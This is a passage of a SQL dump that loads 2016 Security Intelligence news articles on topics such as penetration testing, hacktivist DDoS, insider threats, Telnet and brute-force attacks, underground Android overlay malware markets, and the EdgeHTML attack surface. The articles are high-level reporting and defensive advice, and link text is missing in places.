reviewing interim test results to build complicated attacks just like a cybercriminal would.” Having the required skills in house to carry out an effective penetration testing strategy would be a luxury for any enterprise. As a result, many turn to third-party providers. Knowing who to choose to carry out   can be tricky, however. Fortunately, industry standards may be beneficial because they act as a seal of quality and compliance; they can help you select the right penetration testing company for your needs. In the U.K., for example, the   “provide organizations wishing to buy penetration testing services with confidence that the work will be carried out by qualified individuals with up-to-date knowledge, skill and competence of the latest vulnerabilities and techniques used by real attackers.” Choosing a CREST-accredited penetration testing company would ensure a quality service. The second step in selecting a penetration testing service provider would be to look at the bigger picture. Which of those accredited companies have the breadth of knowledge and services to help you fix the issues uncovered in the  ? A company equipped to provide the end-to-end security service — starting with penetration testing and identifying gaps — can advise and implement the correct solutions. Not only does this close those gaps, but it proactively ensures the company is prepared to fend off future attacks and threats. This process should be cyclical. Regular penetration testing should be carried out periodically, but especially when new partners, technologies or tools are added to the mix. This way, pen testing can be an important and regular part of an organization’s information security risk management process.', '\'Cybersecurity\', \'Penetration Testing\', \'Risk Management\', \'Security Testing\'', 'https://securityintelligence.com/the-path-to-cybersecurity-confidence-starts-with-penetration-testing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (253, 'Hacktivism: Fearmongering or Real Threat?', 'Michelle Alvarez', '2016-5-16', 'With the recent relaunch of Operation Icarus, the hacktivism group Anonymous is back in the spotlight. This campaign is centered on committing distributed denial-of-service (DDoS) attacks targeting banks around the world. Its latest alleged victims? The Bank of Greece and the Central Bank of Cyprus, among  . According to  , the Bank of Greece websites experienced a series of outages that alleged Anonymous members claim is the result of DDoS attacks causing servers to remain offline for several hours. In a statement to  , a bank official explained, “The attack lasted for a few minutes and was successfully tackled by the bank’s security systems.” Motivated by political or social interests, Anonymous is a somewhat disconnected collection of self-interested groups. However, with an issue that resonates with the wider collective, such as the corruption of financial institutions — the reported motivation behind Operation Icarus — Anonymous is still capable of significant attacks. In another recent example, Anonymous hacktivists claimed to target the  , stealing and leaking private information about its officers and evidence. The alleged DDoS attacks against the Bank of Greece and Central Bank of Cyprus are just two incidents in a long list of alleged and actual attacks that fall under hacktivism. This type of cyberattack is not a new phenomenon, and Anonymous is not the only hacktivist group making headlines. There have been numerous campaigns or operations from multiple groups over the years.   tracked more than 180 incidents involving hacktivists since 2011. \n Of the incidents where the attack type is known, more than 70 percent involved  . While just over half of the targets have been based in the U.S., organizations in countries across the globe have been affected — from Canada to Germany, from South Africa to Hong Kong. In terms of industries targeted, one might think hacktivists would mostly go after governments. Although this did rank second, it only made up approximately 28 percent of the targets. With the launch of each new operation, IBM Security customers often look for guidance on how to respond. Separating fact from fiction can be a challenge, especially considering the recent revelations that fake DDoS threats have netted   by cautious businesses who were willing to pay for protection from a perceived threat. Sometimes it’s like the boy who cried wolf: There is little risk of attacks being carried out, and the campaign ends up being more like a hoax. However, many threats have come to fruition, and the proverbial wolf has shown up. So how much weight should be given to these operations? It’s difficult to quantify. The situations are often dynamic and subject to change. It’s important for organizations to remain vigilant if they’re the target of one of these DDoS campaigns — even if their name does not appear on a target list. There are multiple ways to help proactively  : For more guidance on how to protect your company from these kinds of attacks, the IBM white paper “ ” provides additional recommendations for threat prevention and mitigation.', '\'Distributed Denial-of-Service (DDoS) Attacks\', \'Hacktivism\', \'IBM X-Force Research\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/hacktivism-fearmongering-or-real-threat/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (254, 'Insider Attacks May Be Closer Than They Appear', 'Michelle Alvarez', '2016-5-9', 'Reports surfaced in April 2016 indicating that the   vaccinated at hospitals in China was posted for sale. The data, including home address and parent contact information, was obtained in part through unauthorized access and in part by malicious insiders who collaborated with attackers. This is just one of the many examples involving insider attacks globally. According to the recently published “ ,” 60 percent of all attacks in 2015 were carried out by insiders. They either had malicious intent or served as inadvertent actors — insiders who either mistakenly allow an attacker access to data or fail to pay attention to cybersecurity policies. Why is your seemingly trustworthy employee, contractor, client or business partner targeting your organization? There are a number of motives behind cyberattacks as detailed in the IBM report “ .” We know that profit is the driver behind the most active areas of cybercrime. Malicious insiders, however, could also be encouraged by a nation-state to perform espionage. Revenge is another possibility. For example, a disgruntled ex-employee with active credentials cloud access a target’s resources, or maybe he or she has retained corporate documents that could be sold or made public. \n There is good news! Interestingly, this year’s data revealed that while   accounted for 60 percent of all security incidents in 2015, up from 55 percent in 2014, roughly one-third of those attacks were carried out by inadvertent actors. In comparison, these unwilling cohorts contributed to nearly half of all attacks in 2014. What does this mean? Well, it could mean there were fewer “Oops, I didn’t mean to misconfigure a public-facing server to allow search engines to crawl and index corporate data!” Or fewer “Oops, I didn’t mean to click on that malicious attachment that downloaded malware and provided attackers access to hundreds of customer records!” You get the picture. A reduction in the number of attacks attributed to inadvertent actors could mean that more organizations are implementing security policies and  . They’re doing a better job of communicating what’s expected and why it’s important. In addition to security policies and employee education, there are a number of solutions that can mitigate the insider threat. Products that monitor behavior and provide anomaly detection are key. Focusing on access management, specifically  , is an important step toward preventing data breaches. Organizations can go a long way toward an effective defense against malicious insiders by implementing complete data life cycle management. This should help them do a better job of informing employees what to expect and why certain data stores need to be protected.', '\'Access Management\', \'Insider Threat\', \'Privileged Identity Management (PIM)\', \'X-Force\'', 'https://securityintelligence.com/insider-attacks-may-be-closer-than-they-appear/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (255, 'Telnet: An Attacker’s Gateway to the IoT', 'Scott Craig', '2016-5-5', 'As the market continues to proliferate with Internet-connected devices, it’s no surprise that the question of how to secure these new endpoints is garnering more attention. In fact,   predicted that Internet of Things (IoT) security will account for 20 percent of annual security budgets by 2020.  may be important for the future, but the way cybercriminals are targeting these devices can be traced back to 1969 — before the Internet as we know it existed. IBM Security recently released a research report titled “ .” Based on IBM Managed Security Services’ analysis of customer data, it highlighted how one of the oldest protocols for accessing remote computers, Telnet, could act as a key for today’s attackers to   into IoT devices. The report also revealed that cybercriminals are performing port sweeps as part of a   to gather information on potential targets. During these scans, the Telnet port was sought out 79 percent of the time. While Telnet has been around since 1969 and isn’t as widely used as it once was, there are many embedded system applications in IoT devices such as routers, VoIP phones, DVRs, televisions, industrial control systems and others that leverage its remote access capabilities. In fact, a   search conducted earlier this month revealed more than 16 million connected devices globally with an accessible Telnet server. Since Telnet does not encrypt communications, it’s an easy target for attackers to sniff into for user IDs and passwords. Once attackers find an open Telnet port, they can: The use of Telnet to target IoT devices is just one more example of attackers using an older technique to compromise a new technology. IoT devices and   present in our networks don’t always get the level of security review given to a new computer server and can therefore be breached more easily.', '\'Footprinting\', \'IBM Managed Security Services (MSS)\', \'Industrial Control Systems (ICS)\', \'Internet of Things (IoT)\'', 'https://securityintelligence.com/telnet-an-attackers-gateway-to-the-iot/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (256, 'Footprinting and Brute-Force Attacks Remain Prevalent', 'Scott Craig', '2016-5-5', 'Sophisticated cyberattacks grab the headlines these days. But with attention focused on advanced persistent threats and mutating malware, it’s easy to overlook older attacks that are still successful. To keep awareness up, the IBM X-Force threat research team has a new report on old favorites: “ .” An assessment of recent data from  , which continuously monitors billions of events reported by 8,000-plus client devices in over 100 countries, revealed some interesting findings about attack vectors that don’t make headlines anymore: footprinting and brute-force attacks. Often viewed as more of pre-attack reconnaissance used to gather information on potential targets, footprinting encompasses several attack techniques, among them network topology mapping, host discovery, account footprinting, TCP/UDP port scan and TCP/UDP service sweep. Generally, multiple ports are scanned, often coupled with a service (or port) sweep in which multiple hosts in a network are checked for a specific open service port. Service sweeps are often ignored by security monitoring since they occur so regularly and don’t generally warrant an immediate response. The report revealed that the   was sought out 79 percent of the time during a two-day period in Q1 2016. A brute-force password attack is a tactic in which an intruder tries to guess a username and password combination to gain unauthorized access to a system or data. Often an attacker will come across a new system during a footprinting attack and see a login screen banner. A banner that reveals the operating system version will give the attacker an idea of what system-level account names to begin trying, such as admin. Attackers may also target the   service because it provides shell account access across the network. SSH brute-force attacks peaked in May 2015, then trended downward for the rest of the year except for a slight increase in December over November. It’s likely that the botnet known as SSHPsychos was responsible for much of the activity early in the year. The downward trend in later months reflected efforts by members of the   to mitigate this threat. Fortunately, many tools and techniques to thwart these older kinds of cyberattacks have been developed over the years. Organizations that apply them in their environments will be better equipped to deal with ongoing threats. Read the paper to learn more about the attacks and what   recommends to combat them.', '\'Brute-Force Attack\', \'Cybercrime\', \'Footprinting\', \'IBM Managed Security Services (MSS)\', \'IBM X-Force Research\'', 'https://securityintelligence.com/footprinting-and-brute-force-attacks-remain-prevalent/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (257, 'How Black Hats and White Hats Collaborate to Be Successful', 'Aidan Knowles', '2016-5-4', 'Hackers are commonly divided into three hats: white, gray and the infamous black. These colors serve as broad labels describing the   in hacker communities — from the good (white), to the bad (black) and those who fall somewhere in between (gray).\n Generally,   do similar tasks. Both target applications, networks, computer systems, infrastructure and occasionally even people; often, both camps use the same tools and resources. But their work is not completely homogeneous, differentiating on some major points — including motivation, permission, legality and  .\n A white hat is commonly employed or contracted to carry out an attack under explicit permission and clear-cut boundaries. The goal of white hats’ work is to research, find and test vulnerabilities, exploits and viruses in their defined targets. The findings of these professional engagements is reported directly to the target to enable them to fix any holes and strengthen their overall security posture. White hats are also sometimes involved in developing security products and tools.\n In the professional landscape, white hats work under the pretense of multiple job titles — security engineer, security analyst, ethical hacker, penetration tester, security researcher, etc. Some organizations and individuals may stray away from explicitly using the term hacker because of its perceived negative connotations. Conversely, others choose to embrace the hacker terminology. For example, the   is a popular professional certification, while   is a renowned security industry conference. In a different context, hacker may also describe developers who rapidly create software or hardware at hackathons.\n As part of their employment, white hats may specialize in a specific area of cybersecurity. For example, my team and I at the IBM Ireland Lab work solely in penetration testing Web and mobile applications. This enables us to focus our security expertise, threat intelligence and analysis quality at the application layer. In the course of testing, application security engineers may even be invited to review source code for insecure programming practices.\n Other important areas of expertise for security professionals include networks, malware and even social engineering. Regularly, a white hat will function as a de facto consultant inside an organization, advising executives and developers on risk management, threat modeling, planned implementations and other security issues.\n Gray hats, as the name suggests, are more ambiguous in their definition. Their work may be classified as leaning toward good or bad on the spectrum depending on your perspective.\n The term gray hat is sometimes used to describe those who break the law but without criminal intent. This definition may include cyber vandals who deface websites and so-called rogue security researchers who publicly share discovered vulnerabilities without notifying or receiving prior permission from their targets.\n In contrast, black hats cause great intentional damage and profit at the expense of their targets. These hackers are responsible for directing attack trends and inversely stimulating work demands in the white-hat market through harmful, illegal online activities.\n This darker side of the hacker spectrum can be further subcategorized into different camps: cybercriminals, cyber spies, cyber terrorists and hacktivists. What motivates this diverse assortment of black hats? A huge array of   — including money, bragging rights, revenge, media attention, advancement of their beliefs, the pursuit of valuable data and even pure amusement.\n Malicious actors may not always be operating externally from their victim. Research suggested that the   within an organization’s networks and premises, including from current or former employees and contractors, is responsible for a large portion of successful hacks.\n To carry out attacks, black hats may develop their own malicious tools but will frequently employ or repurpose existing white-hat software. Often, the bigger the challenge the target presents, the greater the satisfaction or payoff. No individual, corporation or organization is 100 percent secure; complete immunity from highly determined hackers is nonexistent.\n Black hats capitalize on a diverse assortment of private and public means to communicate and collaborate. In search of recognition and self-satisfaction, some prolific hackers take to social media sites to publicly boast of their exploits, embarrass their targets and expose poor security practices. Others may choose to communicate in cryptic hacking communities and legally dubious forums — many of which can be found on the fringes of the surface Web, accessible with a simple Google search.\n These social platforms often simultaneously serve as a public square, university and marketplace. Data, knowledge and software are the primary commodities; the exchange of exploits, malware, information, tutorials and tools are common among members. Many individuals also sell their skills as a hacker for hire, offering to attack any specified target in exchange for a fee. Reputation and notoriety play a meaningful role in defining the social currency and culture of these unique ecosystems, determining an individual’s trustworthiness and respect.\n Outside of the visible surface Web, shady actors also conduct business in more covert channels, including the Dark Web, private encrypted chats or even offline meetups. These underground mediums provide some privacy for illegal activities, helping to hide the identity of active black hats from watchful law enforcement.\n The bad guys can choose to go it alone, but many collaborate in tandem with others. Contemporary hacking teams have successfully secured the widespread attention of the international media and technology community for their sophisticated attacks against victims spanning  , news organizations, governments and famous individuals.\n There are clear benefits to black hats collaborating. Multiple minds are nearly always better than one, producing bigger, better and badder hacks. However, there is also real danger associated with this close collaboration, such as the risk of exposing the collaborators’ identities.\n In 2011, U.S. hacker   — once more commonly known under pseudonym Sabu — was arrested and charged for his activities. Sabu had been an influential leader of hacking group LulzSec, directly involving himself in an estimated 250 malicious attacks on private and public entities and causing over $50 million in damages. As part of his custodial cooperation with the FBI, Sabu revealed the identities of several other members from his black-hat alma mater, which resulted in multiple prosecutions across the globe.\n Organizations and businesses need to  . They must understand and adopt the mindset of malicious actors to proactively protect and defend their products, infrastructure and assets.\n White hats are often required to mimic or replicate black hats’ attacks. To accomplish this, ethical hackers must keep their fingers firmly on the digital pulse of emerging technologies, vulnerabilities, threats and attack vectors. Even with the greatest effort, it is a constant challenge for security professionals to   and protect against innovations from complex black-hat networks.\n Some security professionals, along with researchers and law enforcement, opt to monitor shady online hacking ecosystems to explore the cutting-edge attack trends, tools and threat landscape. However, despite the benefits of learning through direct connections to the dark side, it is imperative that white hats understand precisely where the fine ethical and legal lines exist in their work.\n In my role as a security engineer, I always opt to demonstrate a vulnerability without going the (frequently unnecessary) whole nine yards, which could risk damaging a system or compromising sensitive customer data. A black hat does not normally bear that ethical responsibility. Malicious hackers are often predisposed to behaving destructively or dangerously in their attacks unless they have a reason to operate more covertly.\n There has been a surge in organizations incorporating open   to outsource part of their security assessments. These popular initiatives are an excellent example of fruitful white-hat collaboration.\n The objective of bug bounty programs is to invite the security community to hack an organization’s products and assets within defined boundaries, encouraging the participants to responsibly disclose any findings to the target owner. This offers security students, enthusiasts and professionals a chance to legally and ethically hack real-world targets using methods normally employed by black hats.\n In return for reporting security issues, hackers are bestowed with formal acknowledgment, swag or money. Where applicable, monetary awards typically function on a sliding scale, awarding as little as $200 for small bugs to as much as $100,000 or more for a critical zero-day vulnerability. Alongside this income, bug bounties offer participants around the world an opportunity to hone their skills, boost their industry reputation or even find employment. Hackers may choose to work independently on bounties or collaborate with others to increase their coverage and effectiveness.\n The chief difference between typical security consultancy and bug bounty programs is that participants in bug bounty programs are not directly employed by the target. For businesses, this economic advantage means they generally are only required to pay out per vulnerability disclosed or, depending on the bug and program terms, sometimes not pay at all. This crowdsourced approach is in stark contrast to the time-based status quo adopted in formal   engagements. In the security industry, there are benefits to both methods.\n Crucially, bug bounty programs offer businesses and organizations a decisive opportunity to preemptively fix a disclosed vulnerability that may have otherwise persisted unknowingly, risking future malicious utilization by a black hat-hacker in an attack.\n Facebook, Google, Yahoo, Mozilla and many other substantial players have successfully adopted bug bounty programs. This positively impacts their ability to keep their products, infrastructure, assets, employees and customers secure. In a recent example, a participant from Facebook’s bug bounty program   in the company’s systems that had been used by a black-hat hacker to log Facebook employees’ credentials.\n For CISOs considering the establishment of a bug bounty program in their organizations, it is essential to ensure the program sets a specific test scope and provides clear vulnerability disclosure instructions. Organizations should also ensure their assets, systems and infrastructure are capable of accommodating a large scale of white-hat attacks.\n As an additional security measure, companies may choose to prescreen and/or monitor bug bounty participants for eligibility and compliance. However, ethical and malicious hacking can be hard to differentiate from an intrusion detection perspective since both types essentially follow and exhibit similar, if not almost identical, attack footprints.\n Likewise, those participating in bug bounty programs must understand and strictly follow any rules or stipulations set by the target owner. These boundaries protect both the business and the security researcher. Many guidelines will mandate that participants don’t exploit any vulnerabilities found and avoid sharing their findings publicly. A violation in the terms of the bug bounty program may result in the hacker not being recognized for the work or even legal prosecution.\n Black hats sometimes collaborate with governments and law enforcement, albeit generally as part of a plea to reduce jail time. Black and gray hats may also decide to collaborate or anonymously share information with whistleblowing organizations and journalists.\n However, direct collaboration between white-hat and black-hat hackers is generally unheard of. As a rule, white hats working in tandem with black hats would risk their employment and reputation. Yet hackers of all colors and inclinations indirectly collaborate by wielding the same resources and tools in the course of their work.\n For example, both white-hat and black-hat hackers benefit from publicly known security vulnerabilities in products and technologies, which are referred to as  . These vulnerabilities are often the results of internal security assessments, bug bounty programs or responsible disclosures from a third party.\n Normally, after a patch has been released, a CVE report is published describing the affected vulnerability — its severity, impact, mitigation techniques and more. These reports and other data on known vulnerabilities are available for all to see, including on sites such as  ,   and the  .\n For IT professionals, CVEs can be used as a checklist in maintaining their assets and overall security posture. Meanwhile, shady hackers can harness this same information to attack the many unpatched systems in the wild. A plethora of tools exist to automate this hacking using the ever-expanding back catalog of known vulnerabilities, including cutting-edge exploits scraped from CVEs. While not always a graceful or clever way to hack, these automated tools can nevertheless be applied successfully for both good and bad purposes.\n Occasionally a hacker will switch camps in the course of a career. There are copious cases of former black-hat hackers turning good and vice versa. Unfortunately for many recently reformed black hats, companies and organizations are often unwilling to employ their services because of their perceived tainted past in spite of their evidently valuable talent and experience.\n White hats play a valuable role in any organization. They respond to malicious activity and raise the baseline defense of products, assets and infrastructure against attacks. Despite these small victories, it is a constant cat-and-mouse game between the white-hat and black-hat communities. This escalating digital arms race is pitched against the context of a growing enterprise demand for penetration testing, audits and  , as well as a global shortage in security graduates and IT personnel.\n There are still lessons to learn from the complex, antagonistic relationship between the black-hat and white-hat camps. This evolving reality is dramatically shaping the cybersecurity space, presenting a pressing challenge that organizations, businesses, governments and educational institutions must all understand to solve.', '\'Bug Bounty\', \'Cybercrime\', \'Hacking\', \'Information Sharing\', \'Penetration Testing\', \'Skills Gap\', \'Threat Intelligence\'', 'https://securityintelligence.com/how-black-hats-and-white-hats-collaborate-to-be-successful/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (258, 'It’s Time to Let Go of QuickTime for Windows', 'Patrick Vowles', '2016-4-29', 'Recently, Trend Micro warned of two serious remote code execution vulnerabilities in  . This was quickly picked up by the  , which issued its own alert concluding that the only safe course of action is to uninstall. Apple has been phasing out development and support for QuickTime for Windows since version 7, released almost a decade ago. Although exploits for these vulnerabilities have yet to be seen in the wild, it’s time to get QuickTime off all Windows machines. There are few remaining dependencies on the product; some Adobe integrations still have dependencies on older codecs that rely on QuickTime, but Adobe is working on a solution. So what about the impact on enterprises where this — and a whole host of other unpatched vulnerabilities — may still be installed? I asked Dr. Dale Meyerrose, retired major general in the U.S. Air Force and former Associate Director of National Intelligence, about the issue. Now an independent consultant, he had much to say about effective remediation techniques. “I’m continuously   where they can get the biggest bang for their buck, their biggest immediate reduction in risk, and for me the answer is almost always the same: basic blocking and tackling, [and] well-implemented continuous internal controls, especially those focused on the vulnerable endpoint,” he said. “Basic housekeeping, though perhaps not the most exciting of topics, is by far one of the largest problems that we really struggle to manage well.” Unfortunately, home users are pretty much on their own to make and implement these decisions. But for the enterprise, this is where certain mechanisms and products such as   can excel, especially with a vibrant and active community of users that create, share and validate fixlets to automate remediation. One such fixlet has already been created by an IBM BigFix user and is available for all to use:', '\'Apple\', \'QuickTime\', \'U.S. Computer Emergency Readiness Team (US-CERT)\', \'Vulnerabilities\', \'Windows\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/its-time-to-let-go-of-quicktime-for-windows/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (259, 'A Future Full of Drones — and the Advanced Threats They Present', 'Kelly Ryver', '2016-4-29', 'In spite of being relatively new technology, drones of varying types and sizes are readily available for consumer purchase. Where there was once one to two predator drones, now there are delivery drones, hobby drones, news drones, Hollywood drones and sightseeing drones.\n Some experimentation in taking a drone apart revealed that most ready-to-ship drones come with the same electronics as a smartphone or tablet. Nearly all drone code is the same as that found in Android except for open-source coding efforts built on Linux platforms, which can be found at  .\n Onboard cameras are capable of storing video — anywhere from five minutes to two hours of video on a USB stick. Some advanced operating systems allow for real-time upload of video to external storage networks.\n Even the cheapest drones have fully operational Wi-Fi, radio frequency and Bluetooth antennas or a combination of all three.\n Drones come in many types or designs, such as aerial, aquatic, submersible, ground-based, quadrupedal and bipedal walkers, and those that can adhere to walls and ceilings. Several universities in the U.S. are experimenting with insect- and animal-like models, but these are not readily available to consumers — yet.\n Drone movement can be preprogrammed or manually controlled by a hand-held device. Manual control requires radio frequency and can operate in several spectra:\n If a drone requires human control for movement, it is classified as a semiautonomous system. If its route or actions can be preset and do not require human intervention to move, it is considered an autonomous system.\n Movement is typically along the x- and y-axes. It can be preprogrammed via code, provided through reference coordinates from a GPS and given by magnetic orientation or from optical queues such as guide markings or lights. Because of these abilities, individuals and organizations must be  .\n Industrial plants should have well-documented plans for avoiding or, at the very least, responding to the following scenarios:\n New software allows drone operators to incorporate infrared and night vision, which could easily be employed to watch and document security patrols around corporate locations, military installations, national laboratories and federal buildings.\n Public and private companies that plan to introduce drones into their environment should have solid response plans for the following:\n The potential to use this cutting-edge technology against civilian populations is staggering. This short section will not do justice to the myriad of ways criminals will repurpose this technology. Here are a few examples that come to mind:\n Reliance on human observation alone is impractical. As a result, the following security measures are viable:\n In a worst-case scenario, physical security personnel could practice their skeet shooting technique on the rogue drone, purchase a couple of drone-hunting eagles or deploy a kill-switch perimeter.\n Organizations must also take care to approach a drone scenario carefully. There are various legal measures to consider:\n Drones can be employed for a wide range of beneficial uses. Some examples include monitoring gas leaks along pipelines where it may be too dangerous for a crew, furthering rescue efforts after earthquakes or natural disasters, determining how bad a meltdown at a reactor is, monitoring livestock, mapping terrain, completing storm damage assessments, monitoring the migration habits of endangered species in remote regions and catching poachers on private property.\n The National Institute of Standards and Technology (NIST) has not yet published a framework for drone hardware, components or source code. Likewise, there is no National Security Agency (NSA) or National Institute of Crime Prevention (NICP) protection profile for drone software outside of those used by the military.\n Even scarier is the total lack of any type of standards, governance or open-source security project related to third-party controls and code bases. These   will become necessary in the very near future.', '\'Cybersecurity\', \'Data Protection\', \'National Institute of Standards and Technology (NIST)\', \'Privacy\', \'Threat Intelligence\'', 'https://securityintelligence.com/a-future-full-of-drones-and-the-advanced-threats-they-present/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (260, 'Mobile Malware Competition Rises in Underground Markets', 'Limor Kessem', '2016-4-28', 'The mobile malware marketplace has been bustling with activity in the past few months. Mobile malware is becoming a central part of underground dealings and an important fraud frontier that’s growing in size and sophistication. A scan of recent events linked with mobile malware includes  , reported by IBM X-Force research in February, and the subsequent   in March 2016. With this later release, the GM Bot author tripled the price of the overlay malware from $5,000 to $15,000. By April, IBM X-Force researchers noticed that GM Bot’s vendor, who goes by the alias GanjaMan, got banned in the top underground markets due to a dispute with a customer. GM Bot is one of the longest-standing overlay malware offerings in the Russian-speaking underground, but it is considered rather expensive. Meanwhile, other developers and malware vendors recognize the profit opportunity in the Android malware market, creating competition in the form of lower-cost alternatives on one hand and more sophisticated offerings on the other. Three alternative offerings actively being sold in underground boards include Bilal Bot, Cron Bot and KNL Bot. These malicious codes are being peddled by their authors for prices ranging from $3,000 to $6,000. While they may not possess the same feature variety as GM Bot, all three claim to have the overlay screen capabilities and data theft ability, according to their vendors. The KNL Bot offering is the most similar to GM Bot judging by its supposed feature list, yet its price point is about half that of GM Bot’s lower-end package. This bot has been around for at least as long as GM Bot has. Its developers are selling the malware with a botnet control panel. They also highlight the malware’s potential monetization options: KNL Bot claims to allow remote attackers to gain control over the infected device, enabling them to obtain online banking credentials and payment card data. The figure below shows the translated KNL Bot forum post. A second offering, dubbed Bilal Bot, is both cheaper and less advanced than malware like GM Bot or KNL. Bilal Bot’s price tag is currently around $3,000 and includes unlimited free bug fixes. On the sales post, this malware’s authors scoff at the long list of functions enabled by competing black hats and link complex functionality with bot crashes and constant bugs. They further attempt to discredit other malware by claiming it is easily detectable because it has been around longer and offers poor technical support. Although this malware is supposedly still in testing mode, Bilal Bot promises to focus on fraud-enabling capabilities, namely overlay screens, SMS hijacking, call forwarding and customized overlay packages. It also will reportedly enable the botmaster to edit and enable overlay screens from the control panel, then send them to the infected bots (see below for its control panel, showing phishing overlay screen edit option). Those functions are yet to be seen in the wild. Cron Bot is a new   offering in the underground that first appeared on April 1, 2016. This newcomer claims to bring sophisticated malicious options reminiscent of PC Trojans to the Android platform. An extract from the vendor’s underground post lists the following features: The Android application package (APK) is a separate piece offering features common to other financially motivated malware. For example: The Cron Bot kit is sold in several pieces: the executable file ($4,000 per month), the APK ($4,000 per month) or a combination of both ($6,000 per month), with or without encryption services and hosting from the vendor ($7,000 per month for the entire package). Cron Bot’s authors are not selling the malware at this time; it is only offered for rent on a monthly basis. This malware-as-a-service model is not rare. Many vendors attempt to protect their codes from being copied or shared with others by launching sales in rental mode. KNL, Cron and Bilal are only three current-day examples from a mobile malware marketplace that has been gaining rapid momentum on many levels. Mobile malware nowadays is picked up and operated by different ranks of cybercriminals — from professional, organized gangs to the least experienced forum readers who buy malware and rely on technical setup and support services from underground vendors. The rising supply of different offerings, including low-cost alternatives, may be in response to the rising demand for fraud-facilitating wares at a time when full-fledged banking Trojans have become the domain of organized crime groups.   is fueled by cybercriminal buyers who see this capability as a panacea to the fraud endeavors they cannot carry out without a banking Trojan operation. IBM X-Force researchers expect overlay malware botnets to further proliferate in the wild due to their ability to facilitate the theft of financial credentials alongside other authentication and customer identification elements. As the risks of infection and financial fraud rise, the combination of user awareness and mobile app security is key to protecting customers from mobile malware’s malice at a time where Android devices can be tricky to secure. One must keep in mind that while Android-based devices mostly get infected with mobile malware when they download apps  , in some cases, malicious apps can make it into the official stores or get   to infiltrate user devices. Furthermore, ensuring that the operating system on any given Android device is up to date and secure is not always a simple feat due to the number of  . It is important to detect the signs and activity of mobile threats on the device. For example, rooted devices present higher risk, and those devices sporting root hiders are even more likely to contain malicious programs. X-Force researchers noted that the new malware offerings have not been analyzed from attacks in the wild. However, these overlay screens are likely to be implemented in the   and therefore may be detected by security solutions that  .', '\'Android\', \'Android Security\', \'GM Bot\', \'Malware\', \'Mobile Malware\', \'Mobile Security\'', 'https://securityintelligence.com/mobile-malware-competition-rises-in-underground-markets/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (261, 'Extracting Malware Behavior From DNS Records', 'David Strom', '2016-4-28', 'It isn’t any surprise that most of malware is hosted by American domains and U.S. Internet providers. But according to the recent “ ,” the underlying infrastructure of most malware sits in either the U.S. or Germany even though attackers live elsewhere.\n The findings should be taken with a grain of salt since Infoblox’s business is protected Domain Name System (DNS) services. Still, these results are worth a closer look.\n Cybercriminals make use of DNS services for their malicious activities. They can hijack legitimate domains or create batches of new ones that closely resemble real ones (such as googel.com) to collect ransomware, launch phishing and denial-of-service (DOS) attacks and execute other activities such as  .\n Infoblox collected data from Internet providers, government agencies and network operators to categorize malicious DNS activities. According to this information, the U.S. hosted 72 percent of malware-related domains, while Germany hosted 20 percent.\n “Hosting infrastructure in the U.S. is very easy to penetrate and put to malicious use,” the report said. “Just because a domain is hosted in the U.S. or Germany does not make it safe.”\n One of the issues identified in the report is that Internet providers are slow to respond to takedown requests from law enforcement.\n In the past, the company saw a boom/bust cycle in its DNS threat index. Its theory was that criminals used the quieter times to collect information and prepare new attacks. However, the index kept increasing to reach near-record levels in the last quarter of 2015.\n “This may indicate a new phase of sustained and simultaneous plant/harvest efforts, pushing the index into uncharted territory,” the report stated.\n Another possible reason for this increase in the threat index is a growing number of exploit kits in use, such as   and the rise of   that has gotten more popular lately. These kits make it easier to target new victims and implement new techniques to spread malware from attackers who are less skilled.\n “This indicates that as exploit kits are updated, we may see the reappearance of past threats in a new guise in coming years,” Infoblox warned. “Exploit kits and other malware can be developed in one country, sold in another and used in a third to launch attacks through systems hosted in a fourth.”\n The moral of the report? Understand what these exploits can do. Security leaders must make sure their domains and DNS servers are properly protected and monitored for abuse. It’s also a good idea to invest in   that can identify advanced threats before they become a massive problem.', '\'Advanced Threats\', \'DNS Hijacking\', \'Domain Name System (DNS)\', \'Malware\'', 'https://securityintelligence.com/extracting-malware-behavior-from-dns-records/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (262, 'Understanding EdgeHTML’s Attack Surface and Exploit Mitigations', 'Mark Yason', '2016-4-28', 'EdgeHTML is the rendering engine of the Edge browser in Windows 10. It is a fork of the MSHTML/Trident rendering engine currently used in Internet Explorer. The forking was done to support modern Web standards and remove legacy code. Early last year, before the release of Edge,   estimated that around 220,000-plus lines of code were removed, while over 300,000 lines of code were added for interoperability fixes and new features. From a security research standpoint, it is both interesting and important to understand what the side effects of these changes are in terms of how the attack surface of the rendering engine has changed. It is also important to identify what exploit mitigations are in place to understand how difficult it is for attackers to exploit vulnerabilities. Due to the number of different file types a rendering engine needs to process — plus the numerous features and Web standards it needs to support — the attack surface of a rendering engine is quite extensive. The diagram below lists the different types of untrusted input that EdgeHTML can process (left), the entry point EdgeHTML class that handles the input (middle) and the dependency used by EdgeHTML to parse the input (right), if any: One of the core functions of a rendering engine is to parse and render HTML and CSS files. Therefore, internal EdgeHTML classes handle the processing of the said files. However, for certain types of files, EdgeHTML uses its dependencies for the actual parsing of the content: What that means in terms of attack surface is that attackers can also remotely reach the parsing code of the above libraries via EdgeHTML. In addition to the different file types that are handled by EdgeHTML, one of the largest attack vectors in EdgeHTML is the Document Object Model (DOM) API. Via the DOM API, JavaScript code can interact directly with DOM objects in the rendering engine. These DOM objects may in turn invoke code in other internal rendering engine objects and, if applicable, invoke code in the libraries they use: Because DOM API calls can affect the state of the DOM tree, DOM objects and other internal rendering engine objects, unexpected input, unexpected state changes, or an incorrect state when a DOM API is called can result in \nmemory corruption vulnerabilities. Examples of memory 